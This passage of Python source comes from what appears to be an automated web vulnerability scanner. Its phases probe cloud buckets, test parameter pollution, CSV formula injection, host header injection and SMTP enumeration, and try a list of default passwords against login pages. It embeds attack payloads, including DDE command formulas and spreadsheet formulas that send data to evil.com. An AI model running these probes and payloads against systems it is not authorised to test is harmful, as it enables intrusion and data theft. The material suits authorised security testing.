        except urllib.error.HTTPError as e:
            if e.code == 405:
                res.append(f"[bucket-write-allowed] {label} — {url} — PUT not allowed (expected)")
        except Exception:
            pass
        return res

    for entry in bucket_entries:
        entry_lower = entry.lower()
        if "s3" in entry_lower or "amazonaws" in entry_lower or "aws" in entry_lower:
            for region in ["us-east-1", "eu-west-1", "us-west-2", ""]:
                base = entry.split(".s3")[0] if ".s3" in entry else entry.split("://")[-1].split("/")[0]
                url = f"https://{base}.s3.{region}.amazonaws.com/" if region else f"https://{base}.s3.amazonaws.com/"
                r = await _probe_bucket(url, entry[:60])
                findings.extend(r)
        elif "blob.core" in entry_lower or "azure" in entry_lower:
            url = entry.rstrip("/") + "?restype=container&comp=list" if "?" not in entry else entry
            r = await _probe_bucket(url, entry[:60])
            findings.extend(r)
        elif "storage.googleapis" in entry_lower or "gcp" in entry_lower or "googleapis" in entry_lower:
            r = await _probe_bucket(entry.rstrip("/") + "/", entry[:60])
            findings.extend(r)
        else:
            for prefix in ["https://", "http://"]:
                if entry.startswith(prefix):
                    r = await _probe_bucket(entry.rstrip("/") + "/", entry[:60])
                    findings.extend(r)

    if not findings:
        findings.append("[bucket-perms] No public bucket permissions detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"50-BUCKET-PERMS: {len(findings)} bucket permission findings → {out}")
    return {"50-BUCKET-PERMS": str(out), "count": len(findings)}


# ────────────────── Phase 51-HPP: HTTP Parameter Pollution ─────────────────────
async def phase_51_HPP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"51-HPP"}:
        return {}
    _out = outdir / "hpp.txt"
    if _out.exists() and not force:
        return {"51-HPP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 51-HPP: HTTP parameter pollution detection")
    findings: List[str] = []
    _h_urlopen = _get_urlopener()
    _h_extra_headers = _extra_headers_dict()
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "51-HPP: no URLs; skipping")
        return {"51-HPP": str(_out), "count": 0}
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:50]
    hpp_pollutions = ["first", "last", "any", "concat"]
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in list(qs.keys())[:3]:
            orig_val = qs[param_name][0]
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for strategy in hpp_pollutions:
                try:
                    if strategy == "first":
                        test_qs = urllib.parse.urlencode({param_name: [orig_val, "hpp_test_first"]}, doseq=True)
                    elif strategy == "last":
                        test_qs = urllib.parse.urlencode({param_name: ["hpp_test_last", orig_val]}, doseq=True)
                    elif strategy == "any":
                        test_qs = urllib.parse.urlencode({param_name: [orig_val, "hpp_test_any"]}, doseq=True)
                    else:
                        test_qs = urllib.parse.urlencode(
                            {f"{param_name}[]": orig_val, param_name: "hpp_test_concat"}, doseq=True)
                    ref_qs = urllib.parse.urlencode(qs, doseq=True)
                    ref_url = urllib.parse.urlunparse(parsed._replace(query=ref_qs))
                    test_url = urllib.parse.urlunparse(parsed._replace(query=test_qs))
                    await _throttle_rate()
                    req = urllib.request.Request(ref_url, headers={"User-Agent": "Mozilla/5.0", **_h_extra_headers})
                    _, _, ref_body_bytes = await _async_urlopen(_h_urlopen, req, timeout=10)
                    treq = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_h_extra_headers})
                    _, _, test_body_bytes = await _async_urlopen(_h_urlopen, treq, timeout=10)
                    ref_body = ref_body_bytes.decode("utf-8", errors="ignore")
                    test_body = test_body_bytes.decode("utf-8", errors="ignore")
                    if len(test_body) != len(ref_body) or "hpp_test" in test_body:
                        findings.append(
                            f"[hpp-reflected] {test_url} param={param_name} strategy={strategy} "
                            f"(response differs from baseline)"
                        )
                        break
                except Exception:
                    continue
    if not findings:
        findings.append("[hpp] No HTTP parameter pollution candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"51-HPP: {len(findings)} HPP findings → {out}")
    return {"51-HPP": str(out), "count": len(findings)}

_SERVERLESS_PATHS = [
    "/api", "/api/", "/api/v1", "/api/v2", "/api/v3",
    "/prod", "/dev", "/staging",
    "/lambda", "/functions", "/function",
    "/.netlify/functions", "/.netlify/",
    "/_ah/api",  # GAE
    "/api/users", "/api/health", "/api/status", "/api/config",
    "/api/swagger.json", "/api/openapi.json",
    "/api/graphql", "/graphql",
    "/admin/api", "/admin",
    "/.env", "/.env.local",
]

async def phase_52_SERVERLESS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"52-SERVERLESS"}:
        return {}
    _out = outdir / "serverless_endpoints.txt"
    if _out.exists() and not force:
        return {"52-SERVERLESS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 52-SERVERLESS: serverless / cloud function endpoint discovery")
    findings: List[str] = []
    _s_urlopen = _get_urlopener()
    _s_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "52-SERVERLESS: no hosts; skipping")
        return {"52-SERVERLESS": str(_out), "count": 0}
    for host in hosts[:20]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        for scheme in ("https://", "http://"):
            for path in _SERVERLESS_PATHS:
                url = f"{scheme}{host_clean}{path}"
                try:
                    req = urllib.request.Request(url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_s_extra_headers})
                    s, _, b = await _async_urlopen(_s_urlopen, req, timeout=8)
                    if s in (200, 201, 202, 204, 401, 403):
                        body_sample = b.decode("utf-8", errors="ignore")[:200]
                        kw_found = [kw for kw in ["api", "user", "admin", "graphql", "swagger", "lambda", "function", "cloud", "runtime", "serverless"] if kw in body_sample.lower()]
                        extra = f" keywords={kw_found}" if kw_found else ""
                        findings.append(f"[serverless-endpoint] {url} — HTTP {s}{extra}")
                except (urllib.error.HTTPError, urllib.error.URLError, OSError):
                    pass
                except Exception:
                    pass
    if not findings:
        findings.append("[serverless] No serverless endpoints discovered")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"52-SERVERLESS: {len(findings)} serverless endpoints → {out}")
    return {"52-SERVERLESS": str(out), "count": len(findings)}

async def phase_53_CSP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"53-CSP"}:
        return {}
    _out = outdir / "csp_analysis.txt"
    if _out.exists() and not force:
        return {"53-CSP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 53-CSP: Content-Security-Policy analysis")
    findings: List[str] = []
    _c_urlopen = _get_urlopener()
    _c_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "53-CSP: no hosts; skipping")
        return {"53-CSP": str(_out), "count": 0}
    for host in hosts[:20]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        for scheme in ("https://", "http://"):
            url = f"{scheme}{host_clean}/"
            try:
                req = urllib.request.Request(url, method="GET",
                    headers={"User-Agent": "Mozilla/5.0", **_c_extra_headers})
                s, headers, body_bytes = await _async_urlopen(_c_urlopen, req, timeout=10)
                csp = headers.get("Content-Security-Policy") or headers.get("Content-Security-Policy-Report-Only") or ""
                if csp:
                    csp_lower = csp.lower()
                    issues = []
                    if "'unsafe-inline'" in csp_lower:
                        issues.append("unsafe-inline present")
                    if "'unsafe-eval'" in csp_lower:
                        issues.append("unsafe-eval present")
                    if "*.google.com" in csp_lower or "*.facebook.com" in csp_lower or "*.cdn" in csp_lower:
                        issues.append("wildcard in CSP source")
                    for cdn in _CSP_BYPASS_CDNS:
                        if cdn in csp_lower:
                            issues.append(f"script-source allows known-bypass CDN: {cdn}")
                    if "https:" in csp_lower and "http:" not in csp_lower:
                        pass
                    elif "http:" in csp_lower:
                        issues.append("CSP allows http: scheme (MITM risk)")
                    if not csp_lower.startswith("default-src") and "default-src " not in csp_lower:
                        issues.append("no default-src defined (fallback to open)")
                    if issues:
                        findings.append(f"[csp-issues] {url} — {'; '.join(issues)}")
                    findings.append(f"[csp-header] {url} — {csp[:200]}")
                else:
                    findings.append(f"[csp-missing] {url} — no Content-Security-Policy header")
                break
            except (urllib.error.HTTPError, urllib.error.URLError, OSError):
                continue
            except Exception:
                continue
        else:
            continue
    if not findings:
        findings.append("[csp] No CSP issues found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"53-CSP: {len(findings)} CSP findings → {out}")
    return {"53-CSP": str(out), "count": len(findings)}

_CSVI_PAYLOADS = [
    "=CMD|'/C calc'!A0",
    "=HYPERLINK(\"http://evil.com/exfil?data=\"&A1,\"Click here\")",
    "=DDE(\"cmd\";\"/c calc\";\"AAA\")",
    "=MSEXCEL|'/C calc'!A0",
    '+DDE("cmd";"/c calc";"AAA")',
    '=IMPORTXML(CONCATENATE("http://evil.com/?d=",MID(A1,1,50)),"//a")',
    "=WEBSERVICE(\"http://evil.com/\"&A1)",
    "@SUM(1+1)*CMD|'/C calc'!A0",
    "=10+20",
    "=1*1",
]

async def phase_55_CSV_INJECT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"55-CSV-INJECT"}:
        return {}
    _out = outdir / "csv_injection.txt"
    if _out.exists() and not force:
        return {"55-CSV-INJECT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 55-CSV-INJECT: CSV / Excel formula injection")
    findings: List[str] = []
    _csv_urlopen = _get_urlopener()
    _csv_extra_headers = _extra_headers_dict()
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "55-CSV-INJECT: no URLs; skipping")
        return {"55-CSV-INJECT": str(_out), "count": 0}
    csv_params = {"export", "download", "report", "csv", "xls", "xlsx", "spreadsheet", "sheet", "format", "type", "file", "name", "filename", "title", "output"}
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:30]
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() not in csv_params:
                continue
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload in _CSVI_PAYLOADS:
                try:
                    test_qs = qs.copy()
                    test_qs[param_name] = [payload]
                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                    await _throttle_rate()
                    req = urllib.request.Request(test_url,
                        headers={"User-Agent": "Mozilla/5.0", **_csv_extra_headers})
                    _, resp_headers, body_bytes = await _async_urlopen(_csv_urlopen, req, timeout=10)
                    body = body_bytes.decode("utf-8", errors="ignore")
                    ctype = resp_headers.get("Content-Type", "")
                    if "csv" in ctype.lower() or "spreadsheet" in ctype.lower() or "excel" in ctype.lower():
                        if "=" in body[:50] or "+" in body[:50] or "@" in body[:50]:
                            findings.append(
                                f"[csvi-candidate] {test_url} param={param_name} payload={payload[:30]}"
                            )
                            break
                except Exception:
                    continue
    if not findings:
        findings.append("[csv-inject] No CSV injection candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"55-CSV-INJECT: {len(findings)} CSV injection findings → {out}")
    return {"55-CSV-INJECT": str(out), "count": len(findings)}


# ────────────────── Phase 56-EXPOSED-DB: Exposed Database / Storage Probing ────
_EXPOSED_DB_PATHS = [
    ("/_search", "Elasticsearch"),
    ("/.kibana", "Kibana"),
    ("/. elasticsearch", "Elasticsearch"),
    ("/sockjs-node/info", "Node.js/SockJS"),
    ("/.env", ".env file"),
    ("/.git/config", "Git config"),
    ("/console", "Cloud console"),
    ("/kibana", "Kibana"),
    ("/api/status", "API status"),
    ("/health", "Health endpoint"),
    ("/swagger-ui.html", "Swagger UI"),
    ("/actuator", "Spring Actuator"),
    ("/actuator/health", "Actuator health"),
    ("/actuator/env", "Actuator env"),
]

_EXPOSED_DB_PORTS = [
    (9200, "Elasticsearch HTTP"),
    (9300, "Elasticsearch transport"),
    (5601, "Kibana"),
    (9090, "Prometheus"),
    (3000, "Grafana/API"),
    (6379, "Redis"),
    (27017, "MongoDB"),
    (5432, "PostgreSQL"),
    (3306, "MySQL"),
    (8081, "CouchDB"),
    (5984, "CouchDB"),
    (9000, "Hadoop/HDFS"),
    (50070, "Hadoop NameNode"),
    (8088, "Hadoop YARN"),
    (2375, "Docker API"),
    (8443, "Kubernetes API"),
    (6443, "Kubernetes API"),
    (10250, "Kubelet API"),
    (10255, "Kubelet API"),
]

async def phase_56_EXPOSED_DB(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"56-EXPOSED-DB"}:
        return {}
    _out = outdir / "exposed_databases.txt"
    if _out.exists() and not force:
        return {"56-EXPOSED-DB": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 56-EXPOSED-DB: exposed database / storage probing")
    findings: List[str] = []
    _db_urlopen = _get_urlopener()
    _db_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        hosts = read_lines(outdir / "resolved.txt") if (outdir / "resolved.txt").exists() else []
    if not hosts:
        log("warn", "56-EXPOSED-DB: no hosts; skipping")
        return {"56-EXPOSED-DB": str(_out), "count": 0}
    ports_file = outdir / "ports.txt"
    all_ports: List[str] = read_lines(ports_file) if ports_file.exists() else []
    for host in hosts[:20]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        for port, label in _EXPOSED_DB_PORTS:
            port_str = f"{host_clean}:{port}"
            if all_ports and not any(port_str in p or f":{port}" in p for p in all_ports):
                continue
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex((host_clean, port))
                sock.close()
                if result == 0:
                    findings.append(f"[exposed-db-port] {host_clean}:{port} — {label} — port open")
                    for path, plabel in _EXPOSED_DB_PATHS:
                        if port in (9200, 9300) and "elasticsearch" in label.lower():
                            url = f"http://{host_clean}:{port}/"
                        elif port == 5601:
                            url = f"http://{host_clean}:{port}/app/kibana"
                        else:
                            url = f"http://{host_clean}:{port}{path}"
                        try:
                            req = urllib.request.Request(url, method="GET",
                                headers={"User-Agent": "Mozilla/5.0", **_db_extra_headers})
                            s, _, db_body = await _async_urlopen(_db_urlopen, req, timeout=5)
                            if s in (200, 201, 401, 403):
                                body_preview = db_body.decode("utf-8", errors="ignore")[:150]
                                findings.append(
                                    f"  [exposed-service] {url} — HTTP {s} — {label} "
                                    f"body: {body_preview[:100]}"
                                )
                        except Exception:
                            pass
            except Exception:
                continue
    if not findings:
        findings.append("[exposed-db] No exposed database services detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"56-EXPOSED-DB: {len(findings)} exposure findings → {out}")
    return {"56-EXPOSED-DB": str(out), "count": len(findings)}

_DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
    ("admin", "123456"), ("admin", "letmein"), ("admin", "root"),
    ("root", "root"), ("root", "admin"), ("root", "toor"),
    ("user", "user"), ("user", "password"), ("user", "123456"),
    ("guest", "guest"), ("test", "test"), ("demo", "demo"),
    ("administrator", "administrator"), ("admin", "Passw0rd!"),
    ("admin", "p@ssw0rd"), ("admin", "changeme"), ("admin", "1234"),
    ("tomcat", "tomcat"), ("admin", "s3cr3t"),
    ("admin", "1q2w3e4r"), ("admin", "qwerty"),
    ("pi", "raspberry"), ("ubnt", "ubnt"),
    ("manager", "manager"), ("kibana", "kibana"),
    ("elastic", "changeme"), ("kibana", "changeme"),
]

async def phase_57_DEFAULT_CREDS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"57-DEFAULT-CREDS"}:
        return {}
    _out = outdir / "default_creds.txt"
    if _out.exists() and not force:
        return {"57-DEFAULT-CREDS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 57-DEFAULT-CREDS: default credentials probing")
    findings: List[str] = []
    _d_urlopen = _get_urlopener()
    _d_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "57-DEFAULT-CREDS: no hosts; skipping")
        return {"57-DEFAULT-CREDS": str(_out), "count": 0}

    login_paths = ["/login", "/admin", "/admin/login", "/wp-admin", "/api/login",
                   "/api/auth", "/auth", "/signin", "/dashboard", "/manager",
                   "/console", "/jenkins/login", "/admin.html", "/login.html",
                   "/administrator", "/user/login", "/api/v1/login"]

    for host in hosts[:15]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        for scheme in ("https://", "http://"):
            base = f"{scheme}{host_clean}"
            for username, password in _DEFAULT_CREDS[:10]:
                for path in login_paths[:5]:
                    url = f"{base}{path}"
                    try:
                        creds_b64 = base64.b64encode(f"{username}:{password}".encode()).decode()
                        req = urllib.request.Request(url, method="GET",
                            headers={
                                "User-Agent": "Mozilla/5.0",
                                "Authorization": f"Basic {creds_b64}",
                                **_d_extra_headers,
                            })
                        s, _, body = await _async_urlopen(_d_urlopen, req, timeout=8)
                        if s in (200, 201, 204, 302, 303):
                            body_lower = body.decode("utf-8", errors="ignore").lower()
                            skip_indicators = ["invalid", "incorrect", "unauthorized", "forbidden",
                                               "access denied", "wrong", "login failed", "authentication failed"]
                            if not any(ind in body_lower for ind in skip_indicators):
                                findings.append(
                                    f"[default-creds-candidate] {url} — {username}:{password} — HTTP {s}"
                                )
                                break
                    except urllib.error.HTTPError as e:
                        if e.code in (200, 201, 204, 302, 303):
                            findings.append(
                                f"[default-creds-candidate] {url} — {username}:{password} — HTTP {e.code}"
                            )
                    except Exception:
                        continue
                else:
                    continue
                break
            break

    if not findings:
        findings.append("[default-creds] No default credentials accepted")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"57-DEFAULT-CREDS: {len(findings)} default cred findings → {out}")
    return {"57-DEFAULT-CREDS": str(out), "count": len(findings)}


# ────────────────── Phase 58-HOST-INJECT: Host Header Injection ─────────────────
_HOST_INJECT_PAYLOADS = [
    "evil.com",
    "evil.com:443",
    "x: 127.0.0.1@evil.com",
    "127.0.0.1",
    "localhost",
    "0.0.0.0",
    "10.0.0.1",
    "192.168.1.1",
    "172.16.0.1",
    "x: 0",
    "x: 1",
    "evil.com\\r\\nX-Forwarded-Host: evil.com",
    "evil.com\\u010d\\nX-Forwarded-Host: evil.com",
    "evil.com\\u2028\\nX-Forwarded-Host: evil.com",
    "evil.com%250d%250aX-Forwarded-Host: evil.com",
    "null",
    "target.com@evil.com",
    "target.com:evil.com",
]

async def phase_58_HOST_INJECT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"58-HOST-INJECT"}:
        return {}
    _out = outdir / "host_header_injection.txt"
    if _out.exists() and not force:
        return {"58-HOST-INJECT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 58-HOST-INJECT: host header injection testing")
    findings: List[str] = []
    _h_urlopen = _get_urlopener()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "58-HOST-INJECT: no hosts; skipping")
        return {"58-HOST-INJECT": str(_out), "count": 0}
    for host in hosts[:10]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        for scheme in ("https://", "http://"):
            url = f"{scheme}{host_clean}/"
            orig_fwd = None
            try:
                base_req = urllib.request.Request(url, method="GET",
                    headers={"User-Agent": "Mozilla/5.0"})
                _, base_headers, base_body = await _async_urlopen(_h_urlopen, base_req, timeout=8)
                orig_fwd = base_headers.get("X-Forwarded-Host", "")
                base_body_str = base_body.decode("utf-8", errors="ignore")
            except Exception:
                base_body_str = ""
            for payload in _HOST_INJECT_PAYLOADS:
                try:
                    req = urllib.request.Request(url, method="GET",
                        headers={
                            "User-Agent": "Mozilla/5.0",
                            "Host": payload,
                            "X-Forwarded-Host": payload,
                            "X-Forwarded-Scheme": "http" if payload == "evil.com" else "https",
                        })
                    s, resp_headers, resp_body = await _async_urlopen(_h_urlopen, req, timeout=8)
                    resp_body_str = resp_body.decode("utf-8", errors="ignore")
                    if payload in resp_body_str:
                        findings.append(f"[host-inject-reflected] {url} — Host: {payload} — reflected in body")
                    if "evil.com" in resp_headers.get("Location", "") or "evil.com" in resp_headers.get("Content-Location", ""):
                        findings.append(f"[host-inject-redirect] {url} — Host: {payload} — redirect to attacker domain")
                    if resp_headers.get("X-Forwarded-Host", "") != orig_fwd:
                        findings.append(f"[host-inject-fwd] {url} — Host: {payload} — XFH modified")
                    if resp_headers.get("Set-Cookie", "") and payload != host_clean:
                        findings.append(f"[host-inject-cookie] {url} — Host: {payload} — cookie set under manipulated host")
                    base_len = len(base_body_str)
                    if base_len and abs(len(resp_body_str) - base_len) > 100:
                        findings.append(f"[host-inject-diff] {url} — Host: {payload} — response size differs by {abs(len(resp_body_str) - base_len)} bytes")
                except Exception:
                    continue
            break
    if not findings:
        findings.append("[host-inject] No host header injection candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"58-HOST-INJECT: {len(findings)} host header injection findings → {out}")
    return {"58-HOST-INJECT": str(out), "count": len(findings)}

async def phase_59_EMAIL_SEC(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"59-EMAIL-SEC"}:
        return {}
    _out = outdir / "email_security.txt"
    if _out.exists() and not force:
        return {"59-EMAIL-SEC": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 59-EMAIL-SEC: email security (SPF/DMARC/DKIM)")
    findings: List[str] = []

    async def _dns_query(record_type: str, name: str) -> List[str]:
        if t.has("dig"):
            try:
                rc, stdout, _ = await _run_cmd_clear_proxy(
                    ["dig", "+short", record_type, name], timeout=10,
                )
                if rc == 0:
                    return [ln.decode().strip() for ln in stdout.splitlines() if ln.strip()]
            except Exception:
                pass
        try:
            rc, stdout, _ = await _run_cmd_clear_proxy(
                ["nslookup", "-type=" + record_type, name], timeout=10,
            )
            if rc >= 0:
                text = stdout.decode(errors="ignore")
                results = []
                for ln in text.splitlines():
                    ln = ln.strip()
                    if "canonical name" in ln.lower() or "name =" in ln.lower():
                        parts = ln.split("=")
                        if len(parts) > 1:
                            results.append(parts[-1].strip().rstrip("."))
                return results
        except Exception:
            pass
        return []

    spf_records = await _dns_query("TXT", domain)
    spf_found = [r for r in spf_records if "v=spf1" in r]
    if spf_found:
        for spf in spf_found:
            if "~all" in spf:
                findings.append(f"[spf-softfail] {domain} — SPF uses ~all (softfail): {spf[:200]}")
            elif "-all" in spf:
                findings.append(f"[spf-hardfail] {domain} — SPF uses -all (hardfail): {spf[:200]}")
            elif "?all" in spf or "+all" in spf:
                findings.append(f"[spf-weak] {domain} — SPF uses ?all/+all (neutral/pass-all): {spf[:200]}")
            else:
                findings.append(f"[spf-present] {domain} — SPF record exists: {spf[:200]}")
    else:
        findings.append(f"[spf-missing] {domain} — no SPF record found (domain is spoofable)")

    dmarc_records = await _dns_query("TXT", f"_dmarc.{domain}")
    dmarc_found = [r for r in dmarc_records if "v=DMARC1" in r]
    if dmarc_found:
        for dmarc in dmarc_found:
            dmarc_lower = dmarc.lower()
            if "p=reject" in dmarc_lower:
                findings.append(f"[dmarc-reject] {domain} — DMARC policy=reject: {dmarc[:200]}")
            elif "p=quarantine" in dmarc_lower:
                findings.append(f"[dmarc-quarantine] {domain} — DMARC policy=quarantine: {dmarc[:200]}")
            elif "p=none" in dmarc_lower:
                findings.append(f"[dmarc-none] {domain} — DMARC policy=none (monitoring only): {dmarc[:200]}")
            else:
                findings.append(f"[dmarc-present] {domain} — DMARC record exists: {dmarc[:200]}")
            if "rua=" not in dmarc_lower and "ruf=" not in dmarc_lower:
                findings.append(f"[dmarc-no-reporting] {domain} — DMARC has no reporting addresses")
    else:
        findings.append(f"[dmarc-missing] {domain} — no DMARC record found (domain is spoofable)")

    for prefix in ["google._domainkey", "selector1._domainkey", "default._domainkey",
                   "dkim._domainkey", "mail._domainkey", "s1._domainkey", "s2._domainkey"]:
        dkim_records = await _dns_query("TXT", f"{prefix}.{domain}")
        if dkim_records:
            findings.append(f"[dkim-present] {domain} — DKIM key found at {prefix}: {dkim_records[0][:100]}")
            break
    else:
        findings.append(f"[dkim-not-found] {domain} — no common DKIM selectors found")

    if not findings:
        findings.append(f"[email-sec] {domain} — email security posture assessed")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"59-EMAIL-SEC: {len(findings)} email security findings → {out}")
    return {"59-EMAIL-SEC": str(out), "count": len(findings)}


# ────────────────── Phase 60-SMTP-ENUM: SMTP Enumeration & Email Bombing ────────
_SMTP_COMMANDS = [
    "VRFY root",
    "VRFY admin",
    "VRFY test",
    "VRFY nobody",
    "EXPN root",
    "EXPN admin",
    "EXPN test",
    "RCPT TO:<root@{domain}>",
    "RCPT TO:<admin@{domain}>",
    "RCPT TO:<test@{domain}>",
]

async def phase_60_SMTP_ENUM(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"60-SMTP-ENUM"}:
        return {}
    _out = outdir / "smtp_enumeration.txt"
    if _out.exists() and not force:
        return {"60-SMTP-ENUM": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 60-SMTP-ENUM: SMTP enumeration & abuse testing")
    findings: List[str] = []
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    mx_hosts: List[str] = []
    if t.has("dig"):
        try:
            rc, stdout, _ = await _run_cmd_clear_proxy(
                ["dig", "+short", "MX", domain], timeout=10,
            )
            if rc == 0:
                for ln in stdout.decode().splitlines():
                    ln = ln.strip()
                    parts = ln.split()
                    if len(parts) >= 2:
                        mx_hosts.append(parts[-1].rstrip("."))
                    elif ln and not ln.startswith(";"):
                        mx_hosts.append(ln.rstrip("."))
        except Exception:
            pass
    smtp_targets = mx_hosts[:5] if mx_hosts else [h for h in hosts[:3] if ":" not in h]
    for smtp_host in smtp_targets:
        smtp_host_clean = smtp_host.split(":")[0].strip()
        if not smtp_host_clean:
            continue
        for port in (25, 587, 465, 2525):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                result = sock.connect_ex((smtp_host_clean, port))
                if result != 0:
                    sock.close()
                    continue
                sock.settimeout(10)
                banner = sock.recv(1024).decode("utf-8", errors="ignore")
                findings.append(f"[smtp-open] {smtp_host_clean}:{port} — SMTP banner: {banner[:100].strip()}")
                for cmd in _SMTP_COMMANDS:
                    try:
                        cmd_filled = cmd.replace("{domain}", domain)
                        sock.sendall(f"{cmd_filled}\r\n".encode())
                        resp = sock.recv(1024).decode("utf-8", errors="ignore")
                        if any(code in resp for code in ["250", "251", "252"]):
                            findings.append(f"[smtp-enum] {smtp_host_clean}:{port} — {cmd_filled} — {resp[:80].strip()}")
                    except Exception:
                        continue
                sock.close()
            except Exception:
                continue
    if not findings:
        findings.append("[smtp-enum] No open SMTP services detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"60-SMTP-ENUM: {len(findings)} SMTP findings → {out}")
    return {"60-SMTP-ENUM": str(out), "count": len(findings)}

_LOG_INJECT_PAYLOADS = [
    "\r\n[INFO] User admin logged in from 127.0.0.1\r\n",
    "\r\n[ERROR] Database connection failed: user=admin password=secret\r\n",
    "\r\n[SECURITY] User authentication bypass successful\r\n",
    "\r\n[INFO] Password reset token: abc123def456\r\n",
    "\r\n[INFO] Credit card: 4111-1111-1111-1111\r\n",
    "\r\n[INFO] Internal IP: 10.0.0.1\r\n",
    "\n[INFO] Injected log entry\n",
    "\r\n[CRITICAL] Stack trace: java.lang.RuntimeException: null\r\n",
]

async def phase_62_LOG_INJECT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"62-LOG-INJECT"}:
        return {}
    _out = outdir / "log_injection.txt"
    if _out.exists() and not force:
        return {"62-LOG-INJECT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 62-LOG-INJECT: log injection / log forging detection")
    findings: List[str] = []
    _l_urlopen = _get_urlopener()
    _l_extra_headers = _extra_headers_dict()
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "62-LOG-INJECT: no URLs; skipping")
        return {"62-LOG-INJECT": str(_out), "count": 0}
    log_params = {"log", "debug", "trace", "level", "logging", "loglevel", "verbose", "v", "output"}
    log_headers = ["X-Forwarded-For", "X-Real-IP", "X-Forwarded-Host", "Referer", "User-Agent"]
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:30]
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
